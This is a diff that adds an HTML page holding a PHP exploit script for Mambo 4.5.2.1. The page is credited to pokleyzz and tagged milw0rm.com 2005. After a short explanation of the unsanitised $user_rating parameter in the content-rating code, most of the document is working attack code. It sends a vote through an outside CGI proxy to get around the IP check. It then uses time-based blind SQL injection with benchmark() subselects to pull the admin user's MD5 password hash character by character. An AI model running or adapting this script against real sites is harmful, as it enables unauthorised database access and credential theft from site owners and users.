@@ -1,0 +1,206 @@
+<html><head><title>Mambo 4.5.2.1 Fetch Password Hash Remote Exploit</title></head><pre>#!/usr/bin/php -q
+Mambo 4.5.2.1 + mysql 4.1 &gt; fetch password hash by pokleyzz &lt;pokleyzz at scan-associates.net&gt;
+
+&lt;?php
+/*
+Mambo 4.5.2.1 + mysql 4.1 &gt; fetch password hash by pokleyzz &lt;pokleyzz at scan-associates.net&gt;
+*content rating using sub query to select from mos_users
+
+Requirement:
+
+	PHP 4.x with curl extension
+
+Description:
+
+The problem occur because $user_rating variable is not properly sanitize when for use in SQL query
+for UPDATE statement. 
+
+&gt;From content.php (components\com_content\content.php)
+-----
+function recordVote ( $url, $user_rating, $cid, $database ){
+	$cid = intval( $cid );
+  
+	if ( ( $user_rating &gt;= 1 ) and ( $user_rating &lt;= 5 ) ) { &lt;--- 1st Checkpoint
+		$currip = getenv( 'REMOTE_ADDR' );
+
+		$query = &quot;SELECT * FROM #__content_rating WHERE content_id = $cid&quot;;
+		$database-&gt;setQuery( $query );
+		$votesdb = NULL;
+		
+		if ( !( $database-&gt;loadObject( $votesdb ) ) ) {
+			$query = &quot;INSERT INTO #__content_rating ( content_id, lastip, rating_sum, rating_count )&quot;
+			. &quot;\n VALUES ( '$cid', '$currip', '$user_rating', '1' )&quot;;
+			$database-&gt;setQuery( $query );
+			$database-&gt;query() or die( $database-&gt;stderr() );;
+		} else {
+			if ($currip &lt;&gt; ($votesdb-&gt;lastip)) { &lt;-- 2nd Checkpoint
+				
+				$query = &quot;UPDATE #__content_rating&quot;
+				. &quot;\n SET rating_count = rating_count + 1,&quot;
+				. &quot;\n rating_sum = rating_sum + $user_rating,&quot; &lt;--- PROBLEM
+				. &quot;\n lastip = '$currip'&quot;
+				. &quot;\n WHERE content_id = &quot;. $cid
+				;
+				$database-&gt;setQuery( $query );
+				$database-&gt;query() or die( $database-&gt;stderr() );
+			} else {
+				mosRedirect ( $url, _ALREADY_VOTE );
+			}
+		}
+		mosRedirect ( $url, _THANKS );
+	}
+}
+-----
+User may escape 1st checkpoint by passing (1-5)(string) value to $user_rating .In PHP beginning
+number in string will be use when comparing number with string.
+
+The 2nd checkpoint will check previous user's ip rated the content. Update statement will only 
+execute when previous ip is different from current ip. This proof of concept will use cgi proxy from 
+http://projectbypass.com to make it possible.
+
+In mySQL 4.1 and above it is possible to use &quot;sub select&quot; in any SQL statement. We will using 
+&quot;blind fishing&quot; with sub select to fetch password hash (md5) for supplied user id. 
+
+Exploiting step:
+
+1) rate from different ip
+2) check time for standard page loading
+3) check time for page loading when benchmark executed.
+		* If error occur mysql version is &lt; 4.1 (no support for sub select)
+4) double the benchmark value. Blind fishing will use this value to do the query.
+5) blind fishing with sub select.
+
+Special thanks:
+
+al3ndaleeb at hotmail.com
+
+*/
+
+if (!(function_exists('curl_init'))) {
+	echo &quot;cURL extension required\n&quot;;
+	exit;
+}
+
+ini_set(&quot;max_execution_time&quot;,&quot;999999&quot;);
+ 
+$benchcount = 150000;
+$aid= 62;
+$cid = 2;
+$charmap = array (48,49,50,51,52,53,54,55,56,57,
+		  97,98,99,100,101,102,
+		  103,104,105,
+		  106,107,108,109,110,111,112,113,
+		  114,115,116,117,118,119,120,121,122
+		  );
+		  
+if($argv[1]){	
+	$url = $argv[1];
+	if ($argv[2])
+		$aid = $argv[2];
+	if ($argv[3])
+		$benchcount = $argv[3];
+	if ($argv[4])
+		$proxy = $argv[4]; 
+}
+else {
+	echo &quot;Usage: &quot;.$argv[0].&quot; &lt;URL&gt; [userid] [benchmarkcount] [proxy]\n\n&quot;;
+	echo &quot;\tURL\t URL to mambo site (ex: http://127.0.0.1)\n&quot;;
+	echo &quot;\taid\t userid to get  (default: 62 (admin))\n&quot;;
+	echo &quot;\tbenchmarkcount\t benchmark count  (default: 150000)\n&quot;;
+	echo &quot;\tproxy\t optional proxy url  (ex: http://10.10.10.10:8080)\n&quot;; 
+	exit;
+}
+
+
+
+// rate from different ip (using http://projectbypass.com)
+
+$projectbypass = &quot;http://projectbypass.com/nph-proxy3.cgi/010110A/&quot;;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$projectbypass.str_replace(&quot;://&quot;,&quot;/&quot;,$url).&quot;/index.php?option=com_content&amp;task=vote&amp;id=1&amp;Itemid=1&amp;cid=$cid&amp;user_rating=1&quot;);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+$res = curl_exec($ch);
+curl_close ($ch);
+
+// standard page loading time
+$start = time();
+$ch = curl_init();
+if ($proxy){
+	curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+}
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+$res  = curl_exec($ch);
+curl_close ($ch);
+$stop = time();
+$sloadtime = floatval($stop - $start);
+echo &quot;standard page loading =&quot;.$sloadtime.&quot;\n&quot;; 
+
+// benchmark page loading time
+$start = time();
+$ch = curl_init();
+if ($proxy){
+	curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+}
+curl_setopt($ch, CURLOPT_URL,$url.&quot;/index.php?option=com_content&amp;task=vote&amp;id=1&amp;Itemid=1&amp;cid=$cid&amp;user_rating=1,rating_sum=(select+1+from+mos_users+where+if(2&gt;1,benchmark($benchcount,md5(1)),1))+where+content_id=$cid/*&quot;);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+$res = curl_exec($ch);
+curl_close ($ch);
+$stop = time();
+$bloadtime = floatval($stop - $start);
+echo &quot;bencmark page loading =&quot;.$bloadtime.&quot;\n&quot;; 
+
+// check if SQL query failed
+if (ereg(&quot;DB function failed&quot;,$res)){
+	echo &quot;[x] mysql &lt; 4.1 detected - not exploitable\n&quot;;
+	exit();
+}
+
+if ($bloadtime &lt;= $sloadtime + 2){
+	echo &quot;[x] increase your benchmark count\n&quot;;
+	exit();
+}
+
+echo &quot;Take your time for Teh Tarik... please wait ...\n\n&quot;;
+echo &quot;Result:\n&quot;;
+echo &quot;\tUserid = $aid\n&quot;;
+echo &quot;\tPassword Hash = &quot;;
+
+// starting fetch password
+
+$benchcount = $benchcount*2;
+		
+for($i= 1;$i&lt; 33;$i++){ 
+	foreach ($charmap as $char){
+		$start = time();
+		echo chr($char);
+		$ch = curl_init();
+		if ($proxy){
+			curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+		}
+		curl_setopt($ch, CURLOPT_URL,$url.&quot;/index.php?option=com_content&amp;task=vote&amp;id=1&amp;Itemid=1&amp;cid=$cid&amp;user_rating=1,rating_sum=(select+password+from+mos_users+where+id=$aid+and+if(ascii(substring(password,$i,1))=$char,benchmark($benchcount,md5(1)),1))+where+content_id=$cid/*&quot;);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+		$res=curl_exec ($ch);
+		curl_close ($ch);
+		$stop = time();
+		$xloadtime = floatval($stop - $start);
+		if (floatval($xloadtime) &gt; $bloadtime){
+			$hash .= chr($char);
+			break 1;
+		}
+		else {
+			echo chr(8);
+		}
+		
+		if ($char == 103){
+			echo &quot;\n\n\tNot Vulnerable or Something wrong occur ...\n&quot;;
+			exit;
+		}
+		
+	}
+}
+echo &quot;\n&quot;;
+
+?&gt;
+
+// milw0rm.com [2005-06-15]</pre></html>
